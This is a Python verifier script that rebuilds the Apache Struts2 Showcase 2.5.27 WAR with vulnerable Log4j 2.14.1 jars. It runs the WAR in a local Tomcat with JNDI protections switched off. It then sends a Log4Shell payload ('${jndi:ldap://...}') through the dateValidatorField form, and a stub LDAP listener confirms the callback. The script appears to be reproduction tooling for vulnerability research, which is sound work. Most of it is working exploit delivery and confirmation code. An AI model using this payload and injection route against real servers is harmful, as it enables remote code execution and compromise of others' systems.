#!/usr/bin/env python3
import argparse
import hashlib
import http.client
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import urllib.parse
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_struts2_showcase_2_5_27_v1_log4j_real_entrypoint"
DOWNSTREAM = "Apache Struts2 Showcase 2.5.27"
WAR_NAME = "struts2-showcase-2.5.27.war"
TOMCAT_NAME = "apache-tomcat-8.5.73"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
BASE = ROOT / "samples" / SAMPLE_ID / "evidence"
WAR = LEGACY_ROOT / "historical-scan" / "struts" / WAR_NAME
TOMCAT_TGZ = LEGACY_ROOT / "historical-scan" / "struts" / f"{TOMCAT_NAME}.tar.gz"
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
V1_RUNTIME_TARGETS = {"WEB-INF/lib/log4j-api-2.12.1.jar", "WEB-INF/lib/log4j-core-2.12.1.jar"}
LOG4J_JARS = {
    "WEB-INF/lib/log4j-api-2.12.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "WEB-INF/lib/log4j-core-2.12.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}
JAVA_HOME = "/usr/lib/jvm/java-11-openjdk-amd64"
LDAP_BIND_RESPONSE = bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0])


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core_bytes(data):
    temp = BASE / "inspect-log4j-core.jar"
    temp.write_bytes(data)
    try:
        with zipfile.ZipFile(temp) as zf:
            names = set(zf.namelist())
            props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
            pom = zf.read(props).decode("utf-8", "replace") if props in names else ""
        return {
            "jndi_lookup_class_present": "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names,
            "jndi_manager_class_present": "org/apache/logging/log4j/core/net/JndiManager.class" in names,
            "version_2_14_1": "version=2.14.1" in pom,
        }
    finally:
        try:
            temp.unlink()
        except FileNotFoundError:
            pass


def build_inserted_war(dest_war):
    if not WAR.exists():
        raise FileNotFoundError(WAR)
    copied = {}
    with zipfile.ZipFile(WAR) as source_war, zipfile.ZipFile(dest_war, "w", zipfile.ZIP_DEFLATED) as target_war:
        names = source_war.namelist()
        for name in names:
            info = source_war.getinfo(name)
            if name in LOG4J_JARS:
                source_jar = LOG4J_JARS[name]
                if not source_jar.exists():
                    raise FileNotFoundError(source_jar)
                data = source_jar.read_bytes()
                target_war.writestr(info, data)
                copied[name] = {
                    "source": str(source_jar),
                    "target": f"{dest_war}!/{name}",
                    "sha256_source": sha256(source_jar),
                    "sha256_target": hashlib.sha256(data).hexdigest(),
                    "is_generated_v1_runtime_jar": name in V1_RUNTIME_TARGETS,
                    "target_filename_preserved_for_downstream_classpath": True,
                }
            else:
                target_war.writestr(info, source_war.read(name))
    with zipfile.ZipFile(dest_war) as zf:
        libs = sorted(name for name in zf.namelist() if name.startswith("WEB-INF/lib/") and "log4j" in name.lower())
        core_bytes = zf.read("WEB-INF/lib/log4j-core-2.12.1.jar")
    return {
        "source_war": str(WAR),
        "inserted_war": str(dest_war),
        "before": sorted(name for name in names if name.startswith("WEB-INF/lib/") and "log4j" in name.lower()),
        "after": libs,
        "copied": copied,
        "log4j_core": inspect_core_bytes(core_bytes),
    }


def free_port():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def start_ldap(case, timeout=45):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (BASE / f"{case}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(LDAP_BIND_RESPONSE)
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"LDAP listener did not start for {case}")
    return port_box["port"], received, thread


def prep_runtime(case):
    run_dir = BASE / f"{case}-runtime"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    run_dir.mkdir(parents=True)
    with tarfile.open(TOMCAT_TGZ, "r:gz") as tar:
        tar.extractall(run_dir)
    tomcat = run_dir / TOMCAT_NAME
    webapps = tomcat / "webapps"
    for child in webapps.iterdir():
        if child.is_dir():
            shutil.rmtree(child)
        else:
            child.unlink()
    inserted_war = BASE / f"{case}-showcase-v1-inserted.war"
    replacement = build_inserted_war(inserted_war)
    shutil.copy2(inserted_war, webapps / "showcase.war")

    http_port = free_port()
    shutdown_port = free_port()
    ajp_port = free_port()
    server_xml = tomcat / "conf" / "server.xml"
    text = server_xml.read_text(encoding="utf-8")
    text = text.replace(
        'port="8005" shutdown="SHUTDOWN"',
        f'port="{shutdown_port}" shutdown="SHUTDOWN"',
    )
    text = text.replace(
        'port="8080" protocol="HTTP/1.1"',
        f'address="127.0.0.1" port="{http_port}" protocol="HTTP/1.1"',
    )
    text = text.replace(
        'port="8009" protocol="AJP/1.3"',
        f'address="127.0.0.1" port="{ajp_port}" protocol="AJP/1.3"',
    )
    server_xml.write_text(text, encoding="utf-8")

    for script in (tomcat / "bin").glob("*.sh"):
        script.chmod(script.stat().st_mode | 0o111)
    return tomcat, http_port, shutdown_port, ajp_port, replacement


def post_value(port, value):
    body = urllib.parse.urlencode(
        {
            "requiredValidatorField": "x",
            "requiredStringValidatorField": "x",
            "integerValidatorField": "1",
            "dateValidatorField": value,
            "emailValidatorField": "a@example.com",
            "urlValidatorField": "http://example.com",
            "stringLengthValidatorField": "abcdef",
            "regexValidatorField": "ABCDE",
            "fieldExpressionValidatorField": "abcd",
        }
    )
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=8)
    try:
        conn.request(
            "POST",
            "/showcase/validation/submitFieldValidatorsExamples.action",
            body,
            {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(body)),
                "Host": f"127.0.0.1:{port}",
            },
        )
        response = conn.getresponse()
        data = response.read(2000).decode("utf-8", "replace")
        return {
            "status": response.status,
            "reason": response.reason,
            "body_prefix": data[:800],
        }
    finally:
        conn.close()


def wait_ready(port, proc, deadline):
    last = None
    while time.time() < deadline:
        if proc.poll() is not None:
            break
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            conn.request("GET", "/showcase/validation/showFieldValidatorsExamples.action")
            response = conn.getresponse()
            data = response.read(500).decode("utf-8", "replace")
            conn.close()
            last = {"status": response.status, "body_prefix": data[:200]}
            if response.status == 200:
                return True, last
        except Exception as exc:
            last = {"error": repr(exc)}
        time.sleep(1)
    return False, last


def stop_tomcat(proc, tomcat):
    try:
        subprocess.run(
            [str(tomcat / "bin" / "catalina.sh"), "stop", "5", "-force"],
            cwd=str(tomcat),
            timeout=12,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass
    if proc.poll() is None:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            proc.wait(timeout=8)
        except Exception:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                proc.wait(timeout=5)
            except Exception:
                pass


def run_case(case, value):
    tomcat, http_port, shutdown_port, ajp_port, replacement = prep_runtime(case)
    stdout_path = BASE / f"{case}-tomcat-console.log"
    env = os.environ.copy()
    env.update(
        {
            "JAVA_HOME": JAVA_HOME,
            "CATALINA_HOME": str(tomcat),
            "CATALINA_BASE": str(tomcat),
            "JAVA_TOOL_OPTIONS": (
                "-Dlog4j2.formatMsgNoLookups=false "
                "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true"
            ),
        }
    )
    with stdout_path.open("w", encoding="utf-8") as stdout:
        proc = subprocess.Popen(
            [str(tomcat / "bin" / "catalina.sh"), "run"],
            cwd=str(tomcat),
            env=env,
            stdout=stdout,
            stderr=subprocess.STDOUT,
            start_new_session=True,
            text=True,
        )
    result = {
        "case": case,
        "http_port": http_port,
        "shutdown_port": shutdown_port,
        "ajp_port": ajp_port,
        "value": value,
        "ready": False,
        "ready_response": None,
        "post_response": None,
        "returncode": None,
        "runtime_replacement": replacement,
    }
    try:
        ready, last = wait_ready(http_port, proc, time.time() + 90)
        result["ready"] = ready
        result["ready_response"] = last
        if ready:
            result["post_response"] = post_value(http_port, value)
            time.sleep(6)
    finally:
        stop_tomcat(proc, tomcat)
        result["returncode"] = proc.poll()

    logs = {}
    for log_path in sorted((tomcat / "logs").glob("*")):
        if not log_path.is_file():
            continue
        text = log_path.read_text(encoding="utf-8", errors="replace")
        copy_path = BASE / f"{case}-{log_path.name}"
        copy_path.write_text(text, encoding="utf-8")
        logs[log_path.name] = {
            "file": str(copy_path),
            "contains_value": value in text,
            "contains_converter_log": "error converting value" in text,
            "tail": text[-6000:],
        }
    console = stdout_path.read_text(encoding="utf-8", errors="replace")
    result["console"] = {
        "file": str(stdout_path),
        "contains_value": value in console,
        "contains_converter_log": "error converting value" in console,
        "tail": console[-6000:],
    }
    result["logs"] = logs
    return result


def dependency_evidence(replacement):
    with zipfile.ZipFile(WAR) as zf:
        libs = [
            name
            for name in zf.namelist()
            if name.startswith("WEB-INF/lib/") and "log4j" in name.lower()
        ]
    (BASE / "dependency-libs.txt").write_text("\n".join(libs) + "\n", encoding="utf-8")
    result = {
        "artifact": str(WAR),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Struts2 Showcase 2.5.27 WAR "
            "with generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc into the "
            "original WEB-INF/lib/log4j-api/core 2.12.1 target filenames before Tomcat loads the webapp"
        ),
        "tomcat_container_archive": str(TOMCAT_TGZ),
        "downstream_runtime_artifact": WAR_NAME,
        "war_log4j_libs_before_insertion": libs,
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": replacement["after"],
        "log4j_core_jar": "WEB-INF/lib/log4j-core-2.12.1.jar",
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
        "source_trigger": (
            "FieldValidatorsExampleAction-conversion.properties maps "
            "dateValidatorField to org.apache.struts2.showcase.chat.DateConverter; "
            "DateConverter logs values[0] through Log4j2 on ParseException."
        ),
    }
    (BASE / "dependency-evidence.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    return result


def summarize_signal(result):
    positive = result["positive"]
    negative = result["negative"]
    dep = result["dependency_evidence"]
    return {
        "positive_ready": positive["ready"],
        "positive_http_post_status": (
            positive.get("post_response") or {}
        ).get("status"),
        "positive_converter_log": positive["console"]["contains_converter_log"],
        "positive_payload_logged": positive["console"]["contains_value"],
        "positive_listener_received_count": positive["listener_received_count"],
        "positive_listener_received": positive["listener_received"],
        "negative_ready": negative["ready"],
        "negative_http_post_status": (
            negative.get("post_response") or {}
        ).get("status"),
        "negative_converter_log": negative["console"]["contains_converter_log"],
        "negative_control_logged": negative["console"]["contains_value"],
        "negative_listener_received_count": negative["listener_received_count"],
        "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
        "jndi_manager_class_present": dep["jndi_manager_class_present"],
        "generated_v1_jars_inserted": all(name in dep["runtime_replacement"]["copied"] for name in V1_RUNTIME_TARGETS),
    }


def write_run_rc(path, exit_code, result):
    signal = summarize_signal(result)
    lines = [f"RUN_RC={exit_code}", f"status={result['status']}"]
    for key, value in signal.items():
        if key == "positive_listener_received":
            continue
        lines.append(f"{key}={value}")
    received = signal.get("positive_listener_received") or []
    if received:
        lines.append(f"listener_data_hex={received[0].get('data_hex')}")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    parser.add_argument("--evidence-dir")
    return parser.parse_args()


def main():
    global ROOT, BASE, WAR, TOMCAT_TGZ
    args = parse_args()
    ROOT = Path(args.workdir)
    BASE = (
        Path(args.evidence_dir)
        if args.evidence_dir
        else ROOT / "samples" / SAMPLE_ID / "evidence"
    )
    WAR = LEGACY_ROOT / "historical-scan" / "struts" / WAR_NAME
    TOMCAT_TGZ = LEGACY_ROOT / "historical-scan" / "struts" / f"{TOMCAT_NAME}.tar.gz"

    if args.fresh and BASE.exists():
        shutil.rmtree(BASE)
    BASE.mkdir(parents=True)

    ldap_port, received, thread = start_ldap("positive")
    payload = "${jndi:ldap://127.0.0.1:%d/a}" % ldap_port
    positive = run_case("positive", payload)
    thread.join(2)
    positive["listener_received"] = received
    positive["listener_received_count"] = len(received)
    dep = dependency_evidence(positive["runtime_replacement"])

    _, negative_received, negative_thread = start_ldap("negative", timeout=12)
    negative = run_case("negative", "strict_control_no_jndi")
    negative_thread.join(1)
    negative["listener_received"] = negative_received
    negative["listener_received_count"] = len(negative_received)

    confirmed = (
        WAR.exists()
        and TOMCAT_TGZ.exists()
        and dep["jndi_lookup_class_present"]
        and dep["jndi_manager_class_present"]
        and dep["runtime_replacement"]["log4j_core"]["version_2_14_1"]
        and all(
            name in dep["runtime_replacement"]["copied"]
            and dep["runtime_replacement"]["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_TARGETS
        )
        and positive["ready"]
        and (positive.get("post_response") or {}).get("status") in (200, 302)
        and positive["listener_received_count"] > 0
        and positive["console"]["contains_converter_log"]
        and positive["console"]["contains_value"]
        and negative["ready"]
        and (negative.get("post_response") or {}).get("status") in (200, 302)
        and negative["listener_received_count"] == 0
        and negative["console"]["contains_converter_log"]
        and negative["console"]["contains_value"]
    )
    result = {
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "sample_id": SAMPLE_ID,
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/struts",
        "downstream_application": DOWNSTREAM,
        "downstream_entrypoint": "Tomcat real HTTP form endpoint",
        "downstream": DOWNSTREAM,
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(WAR),
        "container_archive": str(TOMCAT_TGZ),
        "attack_surface": (
            "HTTP POST to Struts2 Showcase "
            "/validation/submitFieldValidatorsExamples.action dateValidatorField"
        ),
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts generated v1 Log4j "
            "api/core 2.14.1 runtime jar bytes into an isolated Apache Struts2 Showcase "
            "2.5.27 WAR before Tomcat loads the webapp, then triggers Log4Shell through "
            "the real Struts validation form HTTP endpoint."
        ),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(BASE / "dependency-evidence.json"),
        "dynamic_evidence": str(BASE / "probe.json"),
        "run_rc": str(BASE / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_struts_showcase_log4j_v1_inserted.py"),
        "dynamic_signal": {},
        "positive_summary": {
            "ready": positive["ready"],
            "http_post_status": (positive.get("post_response") or {}).get("status"),
            "converter_log": positive["console"]["contains_converter_log"],
            "payload_logged": positive["console"]["contains_value"],
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative_summary": {
            "ready": negative["ready"],
            "http_post_status": (negative.get("post_response") or {}).get("status"),
            "converter_log": negative["console"]["contains_converter_log"],
            "control_logged": negative["console"]["contains_value"],
            "listener_received_count": negative["listener_received_count"],
        },
        "positive": positive,
        "negative": negative,
    }
    result["dynamic_signal"] = summarize_signal(result)
    (BASE / "smoke-result.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (BASE / "probe.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (BASE / "run.log").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    sample_dir = BASE.parent
    (sample_dir / "manifest.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier copies generated v1 Log4j 2.14.1 "
        "`api` and `core` jar bytes from `.m2-poc` into the official Struts2 Showcase 2.5.27 "
        "WAR under the original `WEB-INF/lib/log4j-api-2.12.1.jar` and "
        "`WEB-INF/lib/log4j-core-2.12.1.jar` target filenames, then deploys that isolated "
        "runtime WAR in Tomcat.\n\n"
        "The positive run sends `${jndi:ldap://127.0.0.1:<port>/a}` through the real "
        "`/showcase/validation/submitFieldValidatorsExamples.action` HTTP form field "
        "`dateValidatorField`; the negative run uses the same route with a control value. "
        "Positive must produce one LDAP bind and negative must produce none.\n",
        encoding="utf-8",
    )
    exit_code = 0 if confirmed else 1
    write_run_rc(BASE / "run.rc", exit_code, result)
    print(
        json.dumps(
            {
                "status": result["status"],
                "base": str(BASE),
                "positive_ready": positive["ready"],
                "positive_listener_received_count": positive["listener_received_count"],
                "positive_converter_log": positive["console"]["contains_converter_log"],
                "positive_contains_value": positive["console"]["contains_value"],
                "negative_ready": negative["ready"],
                "negative_listener_received_count": negative["listener_received_count"],
                "negative_converter_log": negative["console"]["contains_converter_log"],
                "negative_contains_value": negative["console"]["contains_value"],
            },
            indent=2,
            sort_keys=True,
        )
    )
    raise SystemExit(exit_code)


if __name__ == "__main__":
    main()
